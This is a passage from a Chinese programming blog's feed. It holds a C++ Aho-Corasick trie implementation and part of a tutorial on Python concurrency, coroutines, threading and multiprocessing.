class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> idx = <span class="hljs-number">0</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trieNode</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> son[<span class="hljs-number">26</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">int</span> counts = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> fail = <span class="hljs-number">-1</span>;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span> &amp;s, <span class="hljs-built_in">vector</span>&lt;trieNode&gt; &amp;trie)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">int</span> cha = s[i] - <span class="hljs-string">'a'</span>;<br>        <span class="hljs-keyword">if</span> (!trie[p].son[cha])<br>            trie[p].son[cha] = ++idx;<br>        p = trie[p].son[cha];<br>    &#125;<br>    trie[p].counts++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">build_fail</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;trieNode&gt; &amp;trie)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">queue</span>&lt;<span class="hljs-keyword">int</span>&gt; q;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (trie[<span class="hljs-number">0</span>].son[i] != <span class="hljs-number">0</span>)<br>        &#123; <span class="hljs-comment">//儿子节点</span><br>            <span class="hljs-keyword">int</span> son = trie[<span class="hljs-number">0</span>].son[i];<br>            trie[son].fail = <span class="hljs-number">0</span>; <span class="hljs-comment">//第一层 fail</span><br>            q.push(son);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (q.<span class="hljs-built_in">size</span>())<br>    &#123;<br>        <span class="hljs-keyword">int</span> father = q.front();<br>        q.pop();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (trie[father].son[i] != <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">int</span> cur = trie[father].son[i];        <span class="hljs-comment">// 要找fail的儿子</span><br>                <span class="hljs-keyword">int</span> failOfFather = trie[father].fail; <span class="hljs-comment">// 父节点的fail</span><br>                <span class="hljs-comment">// ~(0): -1,   ~(-1): 0</span><br>                <span class="hljs-comment">//不是根节点且没有找到目标同字符</span><br>                <span class="hljs-keyword">while</span> (~failOfFather &amp;&amp; !trie[father].son[i])<br>                    failOfFather = trie[failOfFather].fail;<br><br>                <span class="hljs-keyword">if</span> (~failOfFather) <span class="hljs-comment">//找到目标同字符</span><br>                    trie[cur].fail = trie[failOfFather].son[i];<br>                <span class="hljs-keyword">else</span> <span class="hljs-comment">// 根节点</span><br>                    trie[cur].fail = <span class="hljs-number">0</span>;<br>                q.push(cur);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span> &amp;s, <span class="hljs-built_in">vector</span>&lt;trieNode&gt; &amp;trie)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> ptr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">int</span> <span class="hljs-keyword">word</span> = s[i] - <span class="hljs-string">'a'</span>;<br>        <span class="hljs-comment">// 儿子不存在且fail不是根节点，跳转 fail</span><br>        <span class="hljs-keyword">while</span> (!trie[ptr].son[<span class="hljs-keyword">word</span>] &amp;&amp; ~trie[ptr].fail)<br>            ptr = trie[ptr].fail;<br>        <span class="hljs-keyword">if</span> (trie[ptr].son[<span class="hljs-keyword">word</span>]) <span class="hljs-comment">// 儿子存在，匹配，进入节点，继续查找</span><br>            ptr = trie[ptr].son[<span class="hljs-keyword">word</span>];<br>        <span class="hljs-keyword">else</span> <span class="hljs-comment">// 是根节点，下一个 s 字符</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">int</span> ptr_temp = ptr;          <span class="hljs-comment">// copt ptr，ptr为回溯位置</span><br>        <span class="hljs-keyword">while</span> (~trie[ptr_temp].fail) <span class="hljs-comment">//到根节点退出，下一个外层for回溯</span><br>        &#123;<br>            ans += trie[ptr_temp].counts; <span class="hljs-comment">// counts在不是目标处为0</span><br>            ptr_temp = trie[ptr_temp].fail;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;trieNode&gt; trie;<br>    trie.resize(<span class="hljs-number">50</span>);<br><br>    insert(<span class="hljs-string">"she"</span>, trie);<br>    <span class="hljs-built_in">string</span> s = <span class="hljs-string">"he"</span>;<br>    insert(s, trie);<br>    insert(<span class="hljs-string">"her"</span>, trie);<br>    insert(<span class="hljs-string">"is"</span>, trie);<br>    insert(<span class="hljs-string">"this"</span>, trie);<br>    insert(<span class="hljs-string">"his"</span>, trie);<br><br>    build_fail(trie);<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; query(<span class="hljs-string">"sherthis"</span>, trie) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> kmp </tag>
            
            <tag> trie </tag>
            
            <tag> Aho-Corasick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅涉python与分布式</title>
      <link href="/posts/cdee5c8d.html"/>
      <url>/posts/cdee5c8d.html</url>
      
        <content type="html"><![CDATA[<h2><span id="并行和分布式计算介绍">并行和分布式计算介绍</span></h2><p>现代计算的特点，主板上安装多块处理器（每个处理器含有多个核心），这使得计算机能真正地实现并发。</p><blockquote><p>一个处理器同一时间只能处理同一事务；后面章节我们会看到，当处理器快到一定程度，就可以给出同一时间进行多项任务的假象。若要真正实现同一时间多任务，就需要多个处理器。</p></blockquote><p>另一个是高速计算机网络。它让无穷多的电脑实现了相互通讯。</p><h4><span id="并行计算">并行计算</span></h4><p>并行计算是同时使用多个处理器处理事务。</p><h4><span id="分布式计算">分布式计算</span></h4><p>分布式计算是指同一时间使用多台计算机处理一个任务。只有当计算机之间互相连接时，才可以使用分布式计算。要记住，真正的瓶颈往往是数据而不是CPU。</p><p>并行和分布式计算的最明显的差异就是底层的内存架构和访问方式不同。</p><p>并行和四个处理器可以访问同一内存地址。对于分布式应用，不同的并发任务不能正常访问同一内存。原因是，一些任务是在这一台计算机运行，一些任务是在另一台计算机运行，它们是物理分隔的，通过网络进行数据传输。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224103645288.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>现实中，计算机网络通讯就像一个纯粹的分布式内存架构。然而，每台计算机有多个处理器，运行着共享式内存架构。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224103754677.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>分布式内存系统扩展性强、组建成本低：需要更高性能，扩展即可。另一优点是，处理器可以访问各自的内存，不必担心发生Racecondition。</p><p>缺点是，开发者需要手动写数据传输的策略，需要考虑数据存储的位置。另外，不是所有算法都能容易移植到这种架构。</p><h4><span id="阿姆达尔定律">阿姆达尔定律</span></h4><p>考虑一个部分并行的算法，称<code>P</code>为并行分量，<code>S</code>为序列分量（即非并行分量），<code>P+S=100%</code>。<code>T(n)</code>为运行时间，处理器数量为<code>n</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224104425223.png" srcset="/img/loading.gif" lazyload alt style="zoom:60%;"></p><p>对比T(n)和T(1)可以得到，分布式处理的加速比。</p><p>随着<code>n</code>的提高，加速的效果不让人满意。使用10个处理器，是9.2倍速。使用100个处理器，则是50倍速。使用1000个处理器，仅仅是91倍速。</p><p>阿姆达尔定律告诉我们两点：我们最快可以将倍速提高到多少；收益减少时，何时应该减少硬件资源的投入。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/python与分布式_pic/image-20210224104653051.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><h2><span id="异步编程非阻塞编程">异步编程（非阻塞编程）</span></h2><p>与传统的同步编程相比，异步编程或非阻塞编程，可以使性能获得极大提高。</p><p>理想的状态应该是安排一下任务，当一个任务等待I/O时，它处于悬停状态，就让另一个任务接管CPU。这就是异步（也称为事件驱动）编程。</p><p>使用多线程在不同的线程并行运行，也可以达到同样的效果。但是，有一个显著的不同：使用多线程时，是由<strong>操作系统决定</strong>哪个线程处于运行或悬停。然而，在异步编程中，每个任务可以<strong>自己决定</strong>是否放弃CPU。</p><p>另外，单单使用异步编程，我们不能做出真正的并发：同一时间仅仅有一个任务在运行。</p><p>另一点要注意的是，异步编程更善于处理I/O密集型任务，而不是CPU密集型任务（暂停任务不会使性能提高）。</p><p>任何异步代码都要精心选择非阻塞的库，以防使用阻塞代码。</p><h3><span id="协程">协程</span></h3><p>在Python中，让一个功能中途暂停的关键是使用协程。</p><p>协程就是一类函数，它可以通过<code>yield</code>，在指定位置暂停或继续任务。需要注意，尽管协程是强化的生成器，在概念意义上并不等于生成器。原因是，协程与迭代无关。另一不同点，生成器产生值，而协程消除值。</p><blockquote><p>生成器就是一个callable，它生成一个结果序列，而不是返回结果。这是通过产生（通过<code>yield</code>关键字）值而不是返回值</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mygenerator</span><span class="hljs-params">(n)</span>:</span><br>    <span class="hljs-keyword">while</span> n:<br>        n -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">yield</span> n<br></code></pre></div></td></tr></table></figure><p><code>next()</code>从生成的序列产生一个值，本质上，生成器是简化的迭代器，免去了定义类中<code>__iter__</code>和<code>__next__</code>的方法。外，生成器是一次性操作，不能重复生成的序列。</p><p><code>__iter__</code>和<code>__next__</code>方法，运行了迭代协议：前者返回了迭代的对象，后者逐个返回了序列中的元素。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyIterator</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, xs)</span>:</span><br>        self.xs = xs<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__iter__</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-keyword">return</span> self<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__next__</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-keyword">if</span> self.xs:<br>            <span class="hljs-keyword">return</span> self.xs.pop(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> StopIteration<br></code></pre></div></td></tr></table></figure></blockquote><p>协程有三种主要的结构:</p><p><code>yield()</code>： 用来暂停协程的执行</p><p><code>send()</code>： 用来向协程传递数据（以让协程继续执行）</p><p><code>close()</code>：用来关闭协程</p><p>示例</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">complain_about</span><span class="hljs-params">(substring)</span>:</span><br>    print(<span class="hljs-string">'Please talk to me!'</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 执行到此处，控制点返回shell，直到外部send数据到yield处，传递给text</span><br>            text = (<span class="hljs-keyword">yield</span>)<br>            <span class="hljs-keyword">if</span> substring <span class="hljs-keyword">in</span> text:<br>                print(<span class="hljs-string">'Oh no: I found a %s again!'</span><br>                      % (substring))<br>    <span class="hljs-keyword">except</span> GeneratorExit:<br>        print(<span class="hljs-string">'Ok, ok: I am quitting.'</span>)<br></code></pre></div></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; c = complain_about(<span class="hljs-string">'Ruby'</span>)<br><span class="hljs-meta">&gt;&gt;</span>&gt; next(c)<br>Please talk to me!<br><span class="hljs-meta">&gt;&gt;</span>&gt; c.send(<span class="hljs-string">'Test data'</span>)<br><span class="hljs-meta">&gt;&gt;</span>&gt; c.send(<span class="hljs-string">'Some more random text'</span>)<br><span class="hljs-meta">&gt;&gt;</span>&gt; c.send(<span class="hljs-string">'Test data with Ruby somewhere in it'</span>)<br>Oh <span class="hljs-symbol">no:</span> I found a Ruby again!<br><span class="hljs-meta">&gt;&gt;</span>&gt; c.send(<span class="hljs-string">'Stop complaining about Ruby or else!'</span>)<br>Oh <span class="hljs-symbol">no:</span> I found a Ruby again!<br><span class="hljs-meta">&gt;&gt;</span>&gt; c.close()<br>Ok, <span class="hljs-symbol">ok:</span> I am quitting. 复制ErrorOK!<br></code></pre></div></td></tr></table></figure><p>通过 next 启动协程，close关闭。</p><p>词汇计数示例，文本来自http://www.gutenberg.org/cache/epub/2600/pg2600.txt。</p><p>逐行读取文件（通过<code>cat</code>函数）；统计每行中<code>substring</code>的出现次数（<code>grep</code>协程）；求和并打印数据（<code>count</code>协程）。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> wraps<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">coroutine</span><span class="hljs-params">(fn)</span>:</span><br><span class="hljs-meta">    @wraps(fn)</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span><span class="hljs-params">(*args, **kwargs)</span>:</span><br>        c = fn(*args, **kwargs)<br>        next(c)<br>        <span class="hljs-keyword">return</span> c<br><br>    <span class="hljs-keyword">return</span> wrapper<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cat</span><span class="hljs-params">(f, case_insensitive, child)</span>:</span><br>    <span class="hljs-keyword">if</span> case_insensitive:<br>        line_processor = <span class="hljs-keyword">lambda</span> l: l.lower()<br>    <span class="hljs-keyword">else</span>:<br>        line_processor = <span class="hljs-keyword">lambda</span> l: l<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        child.send(line_processor(line))<br><br><br><span class="hljs-meta">@coroutine</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">grep</span><span class="hljs-params">(sub_str, case_insensitive, child)</span>:</span><br>    <span class="hljs-keyword">if</span> case_insensitive:<br>        sub_str = sub_str.lower()<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        text = (<span class="hljs-keyword">yield</span>)  <span class="hljs-comment"># 等待send发送的数据</span><br>        child.send(text.count(sub_str))<br><br><br><span class="hljs-meta">@coroutine</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">count</span><span class="hljs-params">(sub_str)</span>:</span><br>    n = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            n += (<span class="hljs-keyword">yield</span>)<br>    <span class="hljs-keyword">except</span> GeneratorExit:<br>        print(sub_str, n)<br><br><br><span class="hljs-meta">@coroutine</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fanout</span><span class="hljs-params">(children)</span>:</span><br><span class="hljs-comment"># 多个目标同时输入，计数</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data = (<span class="hljs-keyword">yield</span>)<br>        <span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> children:<br>            child.send(data)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    <span class="hljs-keyword">import</span> argparse<br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">'-i'</span>, action=<span class="hljs-string">'store_true'</span>, dest=<span class="hljs-string">'case_insensitive'</span>)<br>    parser.add_argument(<span class="hljs-string">'pattern'</span>, type=str)<br>    parser.add_argument(<span class="hljs-string">'infile'</span>, type=argparse.FileType(<span class="hljs-string">'r'</span>))<br>    args = parser.parse_args()<br><br>    cat(args.infile, args.case_insensitive,<br>        grep(args.pattern, args.case_insensitive, count(args.pattern)))<br><br>    cat(<br>        args.infile, args.case_insensitive,<br>        fanout(<br>            [grep(p, args.case_insensitive, count(p)) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> args.pattern]))<br></code></pre></div></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> <span class="hljs-keyword">grep</span>.<span class="hljs-keyword">py</span> -i love pg2600.txt<br></code></pre></div></td></tr></table></figure><h2><span id="并行计算">并行计算</span></h2><p>如何使用多个CPU进行并行编程的。具体目标是加速CPU密集型任务。</p><h3><span id="多线程">多线程</span></h3><p>在单CPU系统中，使用多线程并不是真正的并行，在给定时间只有一个线程在运行。只有在多CPU计算机上，线程才是并行的。</p><p>尽管Python的线程是OS原生的，全局锁却使特定时间只有一个是运行的。</p><p>当一个协程或进程等待I/O时，让另一个运行CPU，也可以达到并发的效果。当一个任务需要占用CPU大量时间时，CPUBound，就不会有多大提高。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> queue <span class="hljs-keyword">import</span> Queue<br><span class="hljs-keyword">import</span> urllib.request<br>URL = <span class="hljs-string">'http://finance.yahoo.com/d/quotes.csv?s=&#123;&#125;=X&amp;f=p'</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_rate</span><span class="hljs-params">(pair, outq, url_tmplt=URL)</span>:</span><br>    <span class="hljs-keyword">with</span> urllib.request.urlopen(url_tmplt.format(pair)) <span class="hljs-keyword">as</span> res:<br>        body = res.read()<br>    outq.put((pair, float(body.strip())))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    <span class="hljs-keyword">import</span> argparse<br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">'pairs'</span>, type=str, nargs=<span class="hljs-string">'+'</span>)<br>    args = parser.parse_args()<br>    outputq = Queue()<br>    <span class="hljs-keyword">for</span> pair <span class="hljs-keyword">in</span> args.pairs:<br>        t = Thread(target=get_rate, kwargs=&#123;<span class="hljs-string">'pair'</span>: pair, <span class="hljs-string">'outq'</span>: outputq&#125;)<br>        t.daemon = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 结束时，会自行回收线程资源</span><br>        t.start()<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> args.pairs:<br>        pair, rate = outputq.get()<br>        print(pair, rate)<br>        outputq.task_done()<br>    outputq.join()<br></code></pre></div></td></tr></table></figure><h3><span id="多进程">多进程</span></h3><p>为避免全局锁对CPU制约型线程的影响，使用多进程。多进程有一些缺点，它必须启动Python的多个实例，启动时间长，耗费内存多。</p><p>多进程有它们各自的内存空间，使用的是无共享架构，数据访问十分清晰。</p><p>实现并行进程，python提供两个module：<strong>multiprocessing</strong>和<strong>concurrent.futures</strong></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures <span class="hljs-keyword">as</span> cf<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fib</span><span class="hljs-params">(n)</span>:</span><br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span> n == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">elif</span> n &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">'fib(n) is undefined for n &lt; 0'</span>)<br>    <span class="hljs-keyword">return</span> fib(n - <span class="hljs-number">1</span>) + fib(n - <span class="hljs-number">2</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    <span class="hljs-keyword">import</span> argparse<br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">'-n'</span>, type=int, default=<span class="hljs-number">1</span>)<br>    parser.add_argument(<span class="hljs-string">'number'</span>, type=int, nargs=<span class="hljs-string">'?'</span>, default=<span class="hljs-number">34</span>)<br>    args = parser.parse_args()<br>    <span class="hljs-keyword">assert</span> args.n &gt;= <span class="hljs-number">1</span>, <span class="hljs-string">'The number of threads has to be &gt; 1'</span><br>    <br>    <span class="hljs-keyword">with</span> cf.ProcessPoolExecutor(max_workers=args.n) <span class="hljs-keyword">as</span> pool:<br>        results = pool.map(fib, [args.number] * args.n)<br></code></pre></div></td></tr></table></figure><p>在四核处理器的计算机上运行时，可以实现真正的并行，运行一次到四次，时间差不多。</p><p>进程数比处理器数目多时，性能会急剧下降。</p><p>在工作进程之间交换数据，在学习C时，会用到</p><ul><li>管道 (使用最简单)</li><li>信号 (开销最小)</li><li>共享映射区 (无父子关系)</li><li>本地套接字 (最稳定)</li></ul><p><code>multiprocessing</code>模块提供的方法是队列和管道。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> multiprocessing <span class="hljs-keyword">as</span> mp<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fib</span><span class="hljs-params">(n)</span>:</span><br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span> n == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">elif</span> n &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">'fib(n) is undefined 